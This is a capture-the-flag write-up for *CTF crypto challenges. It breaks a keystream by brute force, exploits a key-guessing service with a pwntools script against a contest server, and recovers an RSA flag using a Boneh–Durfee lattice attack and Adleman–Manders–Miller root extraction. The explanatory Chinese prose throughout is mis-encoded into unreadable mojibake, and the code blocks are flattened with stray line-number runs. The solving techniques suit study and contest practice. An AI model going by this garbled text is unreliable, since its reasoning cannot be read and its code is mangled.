key[84:91]æ¯ä¸€è¡Œéƒ½èƒ½æ„é€ å‡ºè¿™ä¹ˆä¸€ä¸ªç­‰å¼ æ ¹æ®æ‰€æœ‰ç­‰å¼, å¯ä»¥å°†åé¢çš„ä¸€äº›ä½æ•°ç”¨å‰é¢çš„ä½æ•°è¡¨ç¤º(ä»–ä»¬éƒ½æ˜¯ç›¸ç­‰çš„) 12345678910111213141516arr = [15, 12, 26, 14, 32, 1, 37, 9, 43, 31, 52, 51, 54, 14, 60, 48, 69, 58, 71, 31, 76, 39, 77, 65, 80, 8, 81, 38, 82, 48, 85, 63, 86, 31, 88, 48, 90, 7, 92, 17, 93, 56, 94, 2, 96, 64, 98, 70, 99, 0, 100, 12, 103, 48, 104, 12, 105, 65, 106, 49, 110, 73, 112, 72, 114, 78, 115, 87, 117, 29, 118, 83]key = [i for i in range(120)]for _ in range(1000): for i in range(0, len(arr), 2): for (j, k) in zip(range((arr[i + 1] * 7), (arr[i + 1] * 7 + 7)), range((arr[i] * 7), (arr[i] * 7 + 7))): if key[j % 120] &lt; key[k % 120]: key[k % 120] = key[j % 120] else: key[j % 120] = key[k % 120]print(key) ç„¶å! å°±èƒ½æŠŠkeyè¿˜åŸæˆ: 1[0, 0, 2, 0, 2, 0, 2, 0, 0, 2, 0, 0, 0, 0, 2, 2, 0, 2, 0, 2, 0, 2, 0, 0, 0, 2, 0, 0, 0, 2, 2, 0, 0, 2, 34, 35, 36, 0, 2, 2, 40, 41, 42, 43, 2, 0, 0, 2, 0, 2, 0, 0, 2, 34, 35, 36, 0, 2, 2, 2, 0, 2, 0, 2, 0, 2, 0, 0, 0, 2, 2, 2, 0, 0, 2, 2, 0, 0, 0, 0, 0, 2, 2, 2, 0, 2, 0, 0, 0, 0, 2, 2, 0, 0, 0, 2, 0, 2, 0, 2, 0, 2, 0, 0, 0, 0, 2, 0, 0, 0, 0, 2, 0, 113, 114, 2, 2, 2, 0, 2] 0å’Œ2åˆ†åˆ«ä»£è¡¨ç€1æˆ–è€…0(ä¸ç¡®å®šæ˜¯0å¯¹åº”1è¿˜æ˜¯2å¯¹åº”1è€Œå…¶ä»–çš„æ¯”è¾ƒå¤§çš„æ•°åˆ™æ˜¯æœªçŸ¥çš„, ä¸€å…±12ä½,æ‰€ä»¥åªéœ€è¦çˆ†ç ´2^12æ¬¡, ç„¶åå†çŒœä¸€ä¸‹0å¯¹åº”çš„æ˜¯1è¿˜æ˜¯0è¿™é‡Œç›´æ¥çŒœ0å¯¹åº”0, ä¸­å•¦! 1234567891011121314151617for i in range(len(key)): if key[i] == 0: key[i] = '0' elif key[i] == 2: key[i] = '1' else: key[i] = '{}'key = ''.join(key)from MyCrypto.Conversion import bin2textfor i in range(2 ** 12): pad = bin(i)[2:].zfill(12) keystream = key.format(pad[0], pad[1], pad[2], pad[3], pad[4], pad[5], pad[6], pad[7], pad[8], pad[9], pad[10], pad[11]) flag = bin2text(keystream) if flag[0] == '*' and flag[-1] == '}' and '{' in flag: print(flag) å¾—åˆ°çš„è¾“å‡º: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128*CTF{ HuG0t1T!}*CTF{ IuG0t1T!}*CTF{ JuG0t1T!}*CTF{ KuG0t1T!}*CTF{ LuG0t1T!}*CTF{ MuG0t1T!}*CTF{ NuG0t1T!}*CTF{ OuG0t1T!}*CTF{\u0019HuG0t1T!}*CTF{\u0019IuG0t1T!}*CTF{\u0019JuG0t1T!}*CTF{\u0019KuG0t1T!}*CTF{\u0019LuG0t1T!}*CTF{\u0019MuG0t1T!}*CTF{\u0019NuG0t1T!}*CTF{\u0019OuG0t1T!}*CTF{)HuG0t1T!}*CTF{)IuG0t1T!}*CTF{)JuG0t1T!}*CTF{)KuG0t1T!}*CTF{)LuG0t1T!}*CTF{)MuG0t1T!}*CTF{)NuG0t1T!}*CTF{)OuG0t1T!}*CTF{9HuG0t1T!}*CTF{9IuG0t1T!}*CTF{9JuG0t1T!}*CTF{9KuG0t1T!}*CTF{9LuG0t1T!}*CTF{9MuG0t1T!}*CTF{9NuG0t1T!}*CTF{9OuG0t1T!}*CTF{IHuG0t1T!}*CTF{IIuG0t1T!}*CTF{IJuG0t1T!}*CTF{IKuG0t1T!}*CTF{ILuG0t1T!}*CTF{IMuG0t1T!}*CTF{INuG0t1T!}*CTF{IOuG0t1T!}*CTF{YHuG0t1T!}*CTF{YIuG0t1T!}*CTF{YJuG0t1T!}*CTF{YKuG0t1T!}*CTF{YLuG0t1T!}*CTF{YMuG0t1T!}*CTF{YNuG0t1T!}*CTF{YOuG0t1T!}*CTF{iHuG0t1T!}*CTF{iIuG0t1T!}*CTF{iJuG0t1T!}*CTF{iKuG0t1T!}*CTF{iLuG0t1T!}*CTF{iMuG0t1T!}*CTF{iNuG0t1T!}*CTF{iOuG0t1T!}*CTF{yHuG0t1T!}*CTF{yIuG0t1T!}*CTF{yJuG0t1T!}*CTF{yKuG0t1T!}*CTF{yLuG0t1T!}*CTF{yMuG0t1T!}*CTF{yNuG0t1T!}*CTF{yOuG0t1T!}*CTF{Â‰HuG0t1T!}*CTF{Â‰IuG0t1T!}*CTF{Â‰JuG0t1T!}*CTF{Â‰KuG0t1T!}*CTF{Â‰LuG0t1T!}*CTF{Â‰MuG0t1T!}*CTF{Â‰NuG0t1T!}*CTF{Â‰OuG0t1T!}*CTF{Â™HuG0t1T!}*CTF{Â™IuG0t1T!}*CTF{Â™JuG0t1T!}*CTF{Â™KuG0t1T!}*CTF{Â™LuG0t1T!}*CTF{Â™MuG0t1T!}*CTF{Â™NuG0t1T!}*CTF{Â™OuG0t1T!}*CTF{Â©HuG0t1T!}*CTF{Â©IuG0t1T!}*CTF{Â©JuG0t1T!}*CTF{Â©KuG0t1T!}*CTF{Â©LuG0t1T!}*CTF{Â©MuG0t1T!}*CTF{Â©NuG0t1T!}*CTF{Â©OuG0t1T!}*CTF{Â¹HuG0t1T!}*CTF{Â¹IuG0t1T!}*CTF{Â¹JuG0t1T!}*CTF{Â¹KuG0t1T!}*CTF{Â¹LuG0t1T!}*CTF{Â¹MuG0t1T!}*CTF{Â¹NuG0t1T!}*CTF{Â¹OuG0t1T!}*CTF{Ã‰HuG0t1T!}*CTF{Ã‰IuG0t1T!}*CTF{Ã‰JuG0t1T!}*CTF{Ã‰KuG0t1T!}*CTF{Ã‰LuG0t1T!}*CTF{Ã‰MuG0t1T!}*CTF{Ã‰NuG0t1T!}*CTF{Ã‰OuG0t1T!}*CTF{Ã™HuG0t1T!}*CTF{Ã™IuG0t1T!}*CTF{Ã™JuG0t1T!}*CTF{Ã™KuG0t1T!}*CTF{Ã™LuG0t1T!}*CTF{Ã™MuG0t1T!}*CTF{Ã™NuG0t1T!}*CTF{Ã™OuG0t1T!}*CTF{Ã©HuG0t1T!}*CTF{Ã©IuG0t1T!}*CTF{Ã©JuG0t1T!}*CTF{Ã©KuG0t1T!}*CTF{Ã©LuG0t1T!}*CTF{Ã©MuG0t1T!}*CTF{Ã©NuG0t1T!}*CTF{Ã©OuG0t1T!}*CTF{Ã¹HuG0t1T!}*CTF{Ã¹IuG0t1T!}*CTF{Ã¹JuG0t1T!}*CTF{Ã¹KuG0t1T!}*CTF{Ã¹LuG0t1T!}*CTF{Ã¹MuG0t1T!}*CTF{Ã¹NuG0t1T!}*CTF{Ã¹OuG0t1T!} è¿˜å¥½å°å­¦è¯»è¿‡è‹±è¯­, æ ¹æ®è¯­ä¹‰çŒœæµ‹flagåœ¨*CTF{YOuG0t1T!}å’Œ*CTF{yOuG0t1T!}ä¹‹ä¸­ çŒœçŒœæ˜¯å“ªä¸ªå‘€ GuessKey2 å…³äºå‡ºé¢˜äººå¿˜è®°æŠŠkeyæ³¨é‡Šæ‰å¤šäº†ä¸€é¢˜GuessKey2é‚£ä»¶äº‹ nc 52.163.228.53 8080é™„ä»¶ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from random import randintimport osfrom flag import flagN=64key=randint(0,2**N)print keykey=bin(key)[2:].rjust(N,'0')count=0while True: p=0 q=0 new_key='' zeros=[0] for j in range(len(key)): if key[j]=='0': zeros.append(j) p=zeros[randint(0,len(zeros))-1] q=zeros[randint(0,len(zeros))-1] try: mask=int(raw_input(&quot;mask:&quot;)) except: exit(0) mask=bin(mask)[2:] if p&gt;q: tmp=q q=p p=tmp cnt=0 for j in range(0,N): if j in range(p,q+1): new_key+=str(int(mask[cnt])^int(key[j])) else: new_key+=key[j] cnt+=1 cnt%=len(mask) key=new_key try: guess=int(raw_input(&quot;guess:&quot;)) except: exit(0) if guess==int(key,2): count+=1 print 'Nice.' else: count=0 print 'Oops.' if count&gt;2: print flag éšæœºç”Ÿæˆä¸€ä¸ªkey, è¾“å…¥mask, æ¯ä¸€è½®éƒ½ä¼šéšæœºçš„åœ¨keyä¸­å–ä¸€æ®µ(å¼€å¤´ç»“å°¾ä¸¤ä½å¿…å®šéƒ½æ˜¯0), ç„¶åä¸maskå¯¹åº”çš„ä¸€æ®µå¼‚æˆ–(maskå…ˆé‡å¤å¡«å……æˆkeyé•¿åº¦). é¢˜ç›®è®©æˆ‘ä»¬çŒœæ¯ä¸€è½®çš„key, è¿ç»­çŒœä¸­3è½®å°±èƒ½å¾—åˆ°flag å¯ä»¥çœ‹åˆ°åªæœ‰è¾“å…¥maskæ‰èƒ½æ”¹å˜key, æƒ³åˆ°keyä¸­æ‹¿æ¥è·Ÿmaskå¼‚æˆ–çš„ç¬¬ä¸€ä½å¿…å®šæ˜¯0, å¦‚æœæœ€å‰é¢çš„0è¢«æ”¹æˆäº†1, é‚£ä¹ˆå®ƒå‰é¢çš„ä½æ•°å’Œå®ƒæœ¬èº«å°±å†ä¹Ÿä¸ä¼šæ”¹å˜äº†, åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹, å¯ä»¥ç–¯ç‹‚ä¼ mask=1,è®©keyçš„æ‰€æœ‰ä½æ•°å˜æˆ1, å½“keyå˜æˆå…¨1ä¹‹å, ä¼ mask=0å°±èƒ½ä¿æŒkeyä¸å˜äº†, ä¸€ç›´ä¼ guess=int('1'*64,2)å°±è¡Œäº† 12345678910111213141516171819202122232425262728293031from random import randintfrom pwn import *mask = '1'key = '1'*64mask = str(int(mask,2))key = str(int(key,2))print(mask)print(key)con = remote('52.163.228.53', 8082)resp = con.recv().decode()print(resp)i = 0while True: con.sendline(mask.encode()) resp = con.recv().decode() con.sendline(key.encode()) resp = con.recvuntil('mask:').decode() print(resp) if 'e' in resp: for _ in range(3): con.sendline('0'.encode()) resp = con.recv().decode() con.sendline(key.encode()) resp = con.recvuntil('mask:').decode() print(resp) break i += 1 print(i) å¤§æ¦‚è·‘ä¸ªä¸€ä¸¤ç™¾è½®?å°±èƒ½å‡ºç»“æœäº† 1*CTF{27d30dad45523cbf88013674a4b5bd29} little case æ€»ä¼šæœ‰ä¸€é“RSAçš„å¯¹å§? é™„ä»¶: 1234567891011121314151617181920212223242526272829303132333435363738from Crypto.Util.number import *from libnum import *from secret import flag,special,p,q,ndef little_trick(msg): p1 = getPrime(1024) q1 = getPrime(1024) n1 = p1 * q1 d1=random.randint(1,2**256) e1=inverse(d1,(p1-1)*(q1-1)) print(n1) print(e1) print(pow(msg,e1,n1))def real_trick(): assert (special &gt; (ord(&quot;*&quot;)*100) and gcd(special,(p-1)*(q-1))!=1 ) print(n) print(pow(libnum.s2n(flag),special,n))if __name__ == '__main__': little_trick(p-1) real_trick()'''è¾“å‡º2166969987538734397576548483417596246134883737144702469545847915461534869733094456671458721785288870229136830663797709549095319270145012779867042595976811838491508201737395131569989900963183447169181181539378474893088095411444674581405813275289782771707788654791147657575125487262392778367025296999507562925554162191776750126124919265354687510453264904321969761646420577202526701932836434976385465949014453108734997446907925523682309641509455203748827775292757990953940131162467144483333261817751335617353757328035272438437637295510003153423681668180539660814764700365362820325868109755204911430836796796718411683956120717541468269984768938524534679430706714860712589983300712432366828367981392533792814384884126053081363266457682162675931547901815985830455612301105504518353600255693451085179954519939635263372257973143178677586338992274607959326361412487748088349413448526455377296931144384663805056580662706419414607407821761761574754611275621927387380065975844282519447660467416826579669726178901884060454994606177784839804528666823956703141147239309978420776148158425922031573513062568162012505209805669623841355103885621402814626329355281853436655713194649170570579414480803671531927080535374958180810697826214794117466378050607176539138222652920461404360773520273885180129341784970598507030048392686221756661237287565905053442793955466822625315468413910881083476950910279105441128302707221794807868597032254219726690214064954521070071544267307987529121635533324469290490574646122678700124382684589146521293911502179320769468863012941550317042792225948425851236718711188795749464241383917033088697531544976656307993001386513048352057551779401166808211428589238421242945296407196294978535989149630746563193256642101047882019579458019902966045857218200463914392352869510880869662530389895867373524679054011076137634873020705462472824066644317774752234608703633137996819211838940304756844580541488194897851858027702702748628429341509762301122850696807175370925635224673318130451371300309661526661336508090976060549801733008596069960777736142956237612437634021542639879792016801613783056356463692225721506626607549462578294397385749078191669411818709478603479243778196460108984354999593988793941076335033865890110802065847595648939130052869128960414959872080301237176577092821104475562604581705387080304086372245855492407601115169556714797690305399391485971463183775543559200698659800620769259901902664475357585338281026191033219744738672741960607394864523837759571912732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406''' ä¸€å…±ä¸¤ä¸ªé—®é¢˜å§ æ ¹æ®n1,e1ä»¥åŠpow(p-1,e1,n1)æ±‚p-1 æ ¹æ®ä¸Šé¢çš„p, n è¿˜æœ‰ä¸€äº›eæœ‰å…³çš„æ¡ä»¶, æ±‚flag æ ¹æ®n1,e1ä»¥åŠpow(p-1,e1,n1)æ±‚p-1e1å¤Ÿå¤§, ç›´æ¥ä¸ŠBoneh_Durfee, ç›´æ¥æ‹¿githubä¸Šé¢çš„è„šæœ¬è·‘äº†(ä¸æƒ³æ”¹äº†â€¦. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331import time############################################# Config##########################################&quot;&quot;&quot;Setting debug to true will display more informationsabout the lattice, the bounds, the vectors...&quot;&quot;&quot;debug = False&quot;&quot;&quot;Setting strict to true will stop the algorithm (andreturn (-1, -1)) if we don't have a correct upperbound on the determinant. Note that this doesn't necesseraly mean that no solutions will be found since the theoretical upperbound isusualy far away from actual results. That is whyyou should probably use `strict = False`&quot;&quot;&quot;strict = False&quot;&quot;&quot;This is experimental, but has provided remarkable resultsso far. It tries to reduce the lattice as much as it canwhile keeping its efficiency. I see no reason not to usethis option, but if things don't work, you should trydisabling it&quot;&quot;&quot;helpful_only = Truedimension_min = 7 # stop removing if lattice reaches that dimension############################################# Functions########################################### display stats on helpful vectorsdef helpful_vectors(BB, modulus): nothelpful = 0 for ii in range(BB.dimensions()[0]): if BB[ii,ii] &gt;= modulus: nothelpful += 1 print (nothelpful, &quot;/&quot;, BB.dimensions()[0], &quot; vectors are not helpful&quot;)# display matrix picture with 0 and Xdef matrix_overview(BB, bound): for ii in range(BB.dimensions()[0]): a = ('%02d ' % ii) for jj in range(BB.dimensions()[1]): a += '0' if BB[ii,jj] == 0 else 'X' if BB.dimensions()[0] &lt; 60: a += ' ' if BB[ii, ii] &gt;= bound: a += '~' print (a)# tries to remove unhelpful vectors# we start at current = n-1 (last vector)def remove_unhelpful(BB, monomials, bound, current): # end of our recursive function if current == -1 or BB.dimensions()[0] &lt;= dimension_min: return BB # we start by checking from the end for ii in range(current, -1, -1): # if it is unhelpful: if BB[ii, ii] &gt;= bound: affected_vectors = 0 affected_vector_index = 0 # let's check if it affects other vectors for jj in range(ii + 1, BB.dimensions()[0]): # if another vector is affected: # we increase the count if BB[jj, ii] != 0: affected_vectors += 1 affected_vector_index = jj # level:0 # if no other vectors end up affected # we remove it if affected_vectors == 0: print (&quot;* removing unhelpful vector&quot;, ii) BB = BB.delete_columns([ii]) BB = BB.delete_rows([ii]) monomials.pop(ii) BB = remove_unhelpful(BB, monomials, bound, ii-1) return BB # level:1 # if just one was affected we check # if it is affecting someone else elif affected_vectors == 1: affected_deeper = True for kk in range(affected_vector_index + 1, BB.dimensions()[0]): # if it is affecting even one vector # we give up on this one if BB[kk, affected_vector_index] != 0: affected_deeper = False # remove both it if no other vector was affected and # this helpful vector is not helpful enough # compared to our unhelpful one if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(bound - BB[ii, ii]): print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index) BB = BB.delete_columns([affected_vector_index, ii]) BB = BB.delete_rows([affected_vector_index, ii]) monomials.pop(affected_vector_index) monomials.pop(ii) BB = remove_unhelpful(BB, monomials, bound, ii-1) return BB # nothing happened return BB&quot;&quot;&quot; Returns:* 0,0 if it fails* -1,-1 if `strict=true`, and determinant doesn't bound* x0,y0 the solutions of `pol`&quot;&quot;&quot;def boneh_durfee(pol, modulus, mm, tt, XX, YY): &quot;&quot;&quot; Boneh and Durfee revisited by Herrmann and May finds a solution if: * d &lt; N^delta * |x| &lt; e^delta * |y| &lt; e^0.5 whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292 &quot;&quot;&quot; # substitution (Herrman and May) PR.&lt;u, x, y&gt; = PolynomialRing(ZZ) Q = PR.quotient(x*y + 1 - u) # u = xy + 1 polZ = Q(pol).lift() UU = XX*YY + 1 # x-shifts gg = [] for kk in range(mm + 1): for ii in range(mm - kk + 1): xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk gg.append(xshift) gg.sort() # x-shifts list of monomials monomials = [] for polynomial in gg: for monomial in polynomial.monomials(): if monomial not in monomials: monomials.append(monomial) monomials.sort() # y-shifts (selected by Herrman and May) for jj in range(1, tt + 1): for kk in range(floor(mm/tt) * jj, mm + 1): yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk) yshift = Q(yshift).lift() gg.append(yshift) # substitution # y-shifts list of monomials for jj in range(1, tt + 1): for kk in range(floor(mm/tt) * jj, mm + 1): monomials.append(u^kk * y^jj) # construct lattice B nn = len(monomials) BB = Matrix(ZZ, nn) for ii in range(nn): BB[ii, 0] = gg[ii](0, 0, 0) for jj in range(1, ii + 1): if monomials[jj] in gg[ii].monomials(): BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY) # Prototype to reduce the lattice if helpful_only: # automatically remove BB = remove_unhelpful(BB, monomials, modulus^mm, nn-1) # reset dimension nn = BB.dimensions()[0] if nn == 0: print (&quot;failure&quot;) return 0,0 # check if vectors are helpful if debug: helpful_vectors(BB, modulus^mm) # check if determinant is correctly bounded det = BB.det() bound = modulus^(mm*nn) if det &gt;= bound: print (&quot;We do not have det &lt; bound. Solutions might not be found.&quot;) print (&quot;Try with highers m and t.&quot;) if debug: diff = (log(det) - log(bound)) / log(2) print (&quot;size det(L) - size e^(m*n) = &quot;, floor(diff)) if strict: return -1, -1 else: print (&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;) # display the lattice basis if debug: matrix_overview(BB, modulus^mm) # LLL if debug: print (&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;) BB = BB.LLL() if debug: print (&quot;LLL is done!&quot;) # transform vector i &amp; j -&gt; polynomials 1 &amp; 2 if debug: print (&quot;looking for independent vectors in the lattice&quot;) found_polynomials = False for pol1_idx in range(nn - 1): for pol2_idx in range(pol1_idx + 1, nn): # for i and j, create the two polynomials PR.&lt;w,z&gt; = PolynomialRing(ZZ) pol1 = pol2 = 0 for jj in range(nn): pol1 += monomials[jj](w*z+1,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY) pol2 += monomials[jj](w*z+1,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY) # resultant PR.&lt;q&gt; = PolynomialRing(ZZ) rr = pol1.resultant(pol2) # are these good polynomials? if rr.is_zero() or rr.monomials() == [1]: continue else: print (&quot;found them, using vectors&quot;, pol1_idx, &quot;and&quot;, pol2_idx) found_polynomials = True break if found_polynomials: break if not found_polynomials: print( &quot;no independant vectors could be found. This should very rarely happen...&quot;) return 0, 0 rr = rr(q, q) # solutions soly = rr.roots() if len(soly) == 0: print (&quot;Your prediction (delta) is too small&quot;) return 0, 0 soly = soly[0][0] ss = pol1(q, soly) solx = ss.roots()[0][0] # return solx, solydef example(): N = 21669699875387343975765484834175962461348837371447024695458479154615348697330944566714587217852888702291368306637977095490953192701450127798670425959768118384915082017373951315699899009631834471691811815393784748930880954114446745814058132752897827717077886547911476575751254872623927783670252969995075629255541621917767501261249192653546875104532649043219697616464205772025267019328364349763854659490144531087349974469079255236823096415094552037488277752927579909539401311624671444833332618177513356173537573280352724384376372955100031534236816681805396608147647003653628203258681097552049114308367967967184116839561 # the public exponent e = 20717541468269984768938524534679430706714860712589983300712432366828367981392533792814384884126053081363266457682162675931547901815985830455612301105504518353600255693451085179954519939635263372257973143178677586338992274607959326361412487748088349413448526455377296931144384663805056580662706419414607407821761761574754611275621927387380065975844282519447660467416826579669726178901884060454994606177784839804528666823956703141147239309978420776148158425922031573513062568162012505209805669623841355103885621402814626329355281853436655713194649170570579414480803671531927080535374958180810697826214794117466378050607 # the hypothesis on the private exponent (the theoretical maximum is 0.292) delta = .29 # this means that d &lt; N^delta # # Lattice (tweak those values) # # you should tweak this (after a first run), (e.g. increment it until a solution is found) for m in range(1,20):# m = 4 # size of the lattice (bigger the better/slower) # you need to be a lattice master to tweak these t = int((1-2*delta) * m) # optimization from Herrmann and May X = 2*floor(N^delta) # this _might_ be too much Y = floor(N^(1/2)) # correct if p, q are ~ same size # # Don't touch anything below # # Problem put in equation P.&lt;x,y&gt; = PolynomialRing(ZZ) A = int((N+1)/2) pol = 1 + x * (A + y) # # Find the solutions! # # Checking bounds if debug: print (&quot;=== checking values ===&quot;) print (&quot;* delta:&quot;, delta) print (&quot;* delta &lt; 0.292&quot;, delta &lt; 0.292) print (&quot;* size of e:&quot;, int(log(e)/log(2))) print (&quot;* size of N:&quot;, int(log(N)/log(2))) print (&quot;* m:&quot;, m, &quot;, t:&quot;, t) # boneh_durfee if debug: print (&quot;=== running algorithm ===&quot;) start_time = time.time() solx, soly = boneh_durfee(pol, e, m, t, X, Y) # found a solution? if solx &gt; 0: print (&quot;=== solution found ===&quot;) if False: print (&quot;x:&quot;, solx) print (&quot;y:&quot;, soly) d = int(pol(solx, soly) / e) print (&quot;private key found:&quot;, d) else: print (&quot;=== no solution was found ===&quot;) if debug: print(&quot;=== %s seconds ===&quot; % (time.time() - start_time))if __name__ == &quot;__main__&quot;: example() è·‘å‡ºd1 =36167461773898995192586226632578677184913220227461899855497899052924496298787 è§£rsa , æœ‰p = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059 æ ¹æ®ä¸Šé¢çš„p, n è¿˜æœ‰ä¸€äº›eæœ‰å…³çš„æ¡ä»¶, æ±‚flagé€šè¿‡p,nå¾—åˆ° 1234c = 12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406p = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059q = 112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741e= è¿™é‡Œæœ‰ä¸ªeæ˜¯æœªçŸ¥çš„, ä½†æ˜¯assert (e &gt; (ord(&quot;*&quot;)*100) and gcd(e,(p-1)*(q-1))!=1 )å¯ä»¥çœ‹åˆ°e&gt;4200è€Œä¸”eä¸phiä¸æ˜¯äº’ç´ çš„â€¦ é©¬ä¸Šæƒ³åˆ°AMMäº†, ä½†æ˜¯è¿™ä¸ªeä¸çŸ¥é“è¯•è¯•ä»4200å¼€å§‹çˆ†ç ´eâ€¦.ç»“æœAMMå®åœ¨æ˜¯è·‘çš„å¤ªä¹…äº†(ä¹Ÿä¸çŸ¥é“ä¸ºå•¥æ ¹æœ¬æ²¡åŠæ³•å¾€ä¸‹çˆ†â€¦ æƒ³å›å»çœ‹çœ‹ä¹‹å‰æ‰¾åˆ°AMMçš„é‚£ä¸ªåšå®¢, æƒ³è‡ªå·±é‡æ–°å†™ä¸€ä¸ªæ¥ç€â€¦â€¦http://yulige.top/?p=752#Sore667pt_6solvers - easyRSAç„¶åâ€¦å°±å‘ç° æ€ä¹ˆåšå®¢é‚£é“é¢˜çš„på’Œqå’Œè¿™é“é¢˜çš„ä¸€æ¨¡ä¸€æ ·å•Š!ä¼šä¸ä¼šeä¹Ÿæ²¡æ”¹?äºæ˜¯è¯•äº†ä¸€ä¸‹åŸé¢˜çš„e = 0x1337, ç„¶åæŠŠæ…¢åˆ°æ‰“æŠŠæ¸¸æˆéƒ½è·‘ä¸å®Œçš„ç»„åˆARTæ”¹æˆç›´æ¥éå†mod pä¸‹çš„0x1337æ¬¡æ–¹æ ¹(åªæœ‰flagå¤ŸçŸ­æ‰èƒ½æˆåŠŸ, äº‹å®ä¸Šåšå‡ºç­”æ¡ˆäº†å‘ç°å‡ºé¢˜äººæ˜¯æœ‰åšpaddingçš„, ä½†æ˜¯ä¼¼ä¹è¿˜æ˜¯å¤ªçŸ­äº†? ç„¶åå°±ç›´æ¥è·‘å‡ºæ¥äº†â€¦. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394import randomimport time# About 3 seconds to rundef AMM(o, r, q): start = time.time() print('\\n----------------------------------------------------------------------------------') print('Start to run Adleman-Manders-Miller Root Extraction Method') print('Try to find one {:#x}th root of {} modulo {}'.format(r, o, q)) g = GF(q) o = g(o) p = g(random.randint(1, q)) while p ^ ((q-1) // r) == 1: p = g(random.randint(1, q)) print('[+] Find p:{}'.format(p)) t = 0 s = q - 1 while s % r == 0: t += 1 s = s // r print('[+] Find s:{}, t:{}'.format(s, t)) k = 1 while (k * s + 1) % r != 0: k += 1 alp = (k * s + 1) // r print('[+] Find alp:{}'.format(alp)) a = p ^ (r**(t-1) * s) b = o ^ (r*alp - 1) c = p ^ s h = 1 for i in range(1, t): d = b ^ (r^(t-1-i)) if d == 1: j = 0 else: print('[+] Calculating DLP...') j = - dicreat_log(a, d) print('[+] Finish DLP...') b = b * (c^r)^j h = h * c^j c = c ^ r result = o^alp * h end = time.time() print(&quot;Finished in {} seconds.&quot;.format(end - start)) print('Find one solution: {}'.format(result)) return resultdef findAllPRoot(p, e): print(&quot;Start to find all the Primitive {:#x}th root of 1 modulo {}.&quot;.format(e, p)) start = time.time() proot = set() while len(proot) &lt; e: proot.add(pow(random.randint(2, p-1), (p-1)//e, p)) end = time.time() print(&quot;Finished in {} seconds.&quot;.format(end - start)) return prootdef findAllSolutions(mp, proot, cp, p): print(&quot;Start to find all the {:#x}th root of {} modulo {}.&quot;.format(e, cp, p)) start = time.time() all_mp = set() for root in proot: mp2 = mp * root % p assert(pow(mp2, e, p) == cp) all_mp.add(mp2) end = time.time() print(&quot;Finished in {} seconds.&quot;.format(end - start)) return all_mpfrom Crypto.Util.number import long_to_bytesc = 12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406p = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059q = 112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741e = 0x1337cp = c % pmp = AMM(cp, e, p)p_proot = findAllPRoot(p, e)mps = findAllSolutions(mp, p_proot, cp, p)def check(m): if long_to_bytes(m).decode('utf-8','ignore').startswith('*CTF'): print(long_to_bytes(m)) exit() return True elif long_to_bytes(m).decode('utf-8','ignore').startswith('*ctf'): print(long_to_bytes(m)) exit() return True else: return Falsefor mpp in mps: check(int(mpp)) è¾“å‡º 